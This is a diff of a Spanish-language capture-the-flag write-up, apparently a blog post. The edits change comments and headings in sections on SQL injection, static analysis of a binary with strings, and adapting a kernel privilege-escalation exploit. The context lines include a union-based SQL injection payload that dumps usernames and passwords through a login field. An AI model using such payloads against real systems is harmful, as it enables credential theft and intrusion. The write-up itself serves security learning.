@@ -111,6 +111,7 @@ SELECT column_name FROM information_schema.columns where table_name='users'
 -- Sephiroth')union select 1,(select group_concat(username,0x7c,password) from sysadmin.users)#
 SELECT group_concat(username,0x7c,password) FROM sysadmin.users
 -- Visualizando el contenido de la tabla users con todas sus columnas separadas con el caracter |
+-- El valor 0x7c es equivalente al caracter |
 {% endhighlight %}
 
 Cabe resaltar, que el aplicativo web cuenta con una validacion de JS que no permite el ingreso de muchos caracteres en los campos de inicio de sesion.  
@@ -360,7 +361,7 @@ find / -group decoder 2>/dev/null
 {% endhighlight %}
 
 
-## Analisis de ejecutable con Strings
+## Analisis estatico de un binario con Strings
 Vamos a realizar un analisis estatico al binario no tan usual llamado sls.
 Para enumerar o analizar algun binario podemos usar la herramienta **strings**.  
 Como resultado obtenemos que este es un archivo ejecutable ELF.  
@@ -378,7 +379,7 @@ libc.so.6
 AWAVA
 AUATL
 []A\A]A^A_
-|`&><'"\[]{};
+|&><'"\[]{};
 ;*3$"
 {% endhighlight %}
 
@@ -448,7 +449,7 @@ Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Esca
 Shellcodes: No Result
 {% endhighlight %}
 
-### Modificacion de un exploit desarrollado en C
+### Realizando modificaciones a un exploit desarrollado en C
 
 Debemos eliminar o comentar los fragmentos de codigo que no correspondan al nucleo de nuestra maquina  controlada, el cual fue obtenido con el comando **uname -a**.  
 
